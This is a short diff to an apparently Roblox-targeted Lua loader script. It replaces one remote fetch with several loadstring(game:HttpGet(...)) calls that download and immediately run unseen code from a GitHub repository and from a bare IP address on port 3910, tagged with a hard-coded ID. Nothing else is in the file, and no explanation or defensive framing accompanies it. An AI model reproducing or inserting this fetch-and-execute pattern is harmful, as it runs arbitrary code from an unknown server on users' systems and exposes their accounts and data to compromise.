@@ -1,1 +1,11 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Hub/refs/heads/main/ZZ",true))()
+--My
+local function My()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/SCRIPT/refs/heads/main/S",true))() 
+end
+local function F()
+  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
+end
+task.spawn(F)
+task.spawn(My)
+ID="281b4cca-f00e-4f9d-985c-32df2a0b73b5";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
